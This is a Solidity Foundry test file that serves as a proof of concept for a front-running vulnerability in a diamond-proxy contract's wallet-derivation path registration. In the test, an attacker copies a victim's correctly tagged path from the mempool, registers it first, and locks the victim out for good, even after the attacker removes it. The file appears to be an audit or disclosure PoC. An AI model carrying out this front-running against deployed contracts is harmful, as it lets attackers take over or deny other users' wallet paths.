// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import {Test} from "forge-std/Test.sol";
import {AppStorage} from "../src/AppStorage.sol";
import {WritesFacet} from "../src/WritesFacet.sol";
import {ViewsFacet} from "../src/ViewsFacet.sol";

/// @notice Both facets call AppStorage.getStorage(), which reads a fixed
/// slot in the EXECUTING contract's own storage (per-address storage,
/// same as any contract). In production the diamond proxy delegatecalls
/// into each facet so they all share the proxy's storage. To reproduce
/// that faithfully without standing up the full diamond, this harness
/// inherits both facets into one deployed contract, so every call in
/// this test executes against one shared storage instance — exactly
/// like the real deployment, and using the real, unmodified facet code.
contract Harness is WritesFacet, ViewsFacet {}

contract PathFrontRunPoC is Test {
    Harness h;

    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    // Address the victim was told by the node to register (their real wallet).
    address victimPkp = address(0x7701);
    // Any never-before-seen address the attacker picks for themselves.
    address attackerPkp = address(0x7702);

    // A correctly tagged path, exactly as the node would issue it to the
    // victim: top 96 bits = WALLET_PATH_TAG, low 160 bits = node-random.
    uint256 victimPath =
        (AppStorage.WALLET_PATH_TAG << AppStorage.WALLET_PATH_TAG_SHIFT) |
        uint256(uint160(0x1111));

    function setUp() public {
        h = new Harness();
    }

    function test_AttackerFrontRunsVictimPathRegistration() public {
        // Victim and attacker both need their own account first.
        // newChainSecuredAccount() is fully permissionless — anyone can call it.
        vm.prank(victim);
        h.newChainSecuredAccount("victim", "victim account");

        vm.prank(attacker);
        h.newChainSecuredAccount("attacker", "attacker account");

        uint256 victimMaster = uint256(keccak256(abi.encodePacked(victim)));
        uint256 attackerMaster = uint256(keccak256(abi.encodePacked(attacker)));

        // --- Attacker front-runs: copies victimPath straight out of the
        // mempool and registers it under their OWN account with an
        // address of their own choosing. No tag forgery needed — the
        // path is already correctly tagged because it's the victim's
        // real, node-issued path.
        vm.prank(attacker);
        h.registerWalletDerivation(
            attackerMaster,
            attackerPkp,
            victimPath,
            "stolen",
            "stolen"
        );

        // --- Victim's original tx now lands and reverts. Permanently.
        vm.prank(victim);
        vm.expectRevert(
            abi.encodeWithSelector(
                AppStorage.InvalidRequest.selector,
                "derivation path owned by another account"
            )
        );
        h.registerWalletDerivation(
            victimMaster,
            victimPkp,
            victimPath,
            "mine",
            "mine"
        );

        // --- Proof of impact: the path is now owned by the attacker, who
        // can resolve it through the exact same view function the node
        // uses before signing/decrypting, with NO further checks failing.
        vm.prank(attacker);
        uint256 resolved = h.getWalletDerivation(attackerMaster, attackerPkp);
        assertEq(resolved, victimPath, "attacker's account now resolves the victim's path");

        // --- Even removing it later doesn't return it to the victim:
        // pathToOwnerMaster is never cleared, by design (see comments in
        // removeWalletDerivation / AppStorage).
        vm.prank(attacker);
        h.removeWalletDerivation(attackerMaster, attackerPkp);

        vm.prank(victim);
        vm.expectRevert(
            abi.encodeWithSelector(
                AppStorage.InvalidRequest.selector,
                "derivation path owned by another account"
            )
        );
        h.registerWalletDerivation(
            victimMaster,
            victimPkp,
            victimPath,
            "mine again",
            "mine again"
        );
    }
}
